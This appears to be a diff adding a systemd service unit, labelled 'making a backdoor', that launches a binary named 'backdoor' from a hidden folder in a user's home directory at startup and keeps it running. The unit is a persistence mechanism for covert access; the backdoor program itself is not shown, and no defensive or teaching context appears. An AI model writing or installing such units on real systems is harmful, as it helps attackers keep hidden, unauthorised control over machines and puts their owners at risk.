@@ -1,0 +1,12 @@
+[Unit]
+Description=making a backdoor
+After=getty.target
+
+[Service]
+Type=simple
+RemainAfterExit=yes
+ExecStart=/home/luca/Scrivania/.Hidden_folder/backdoor
+
+
+[Install]
+WantedBy=default.target
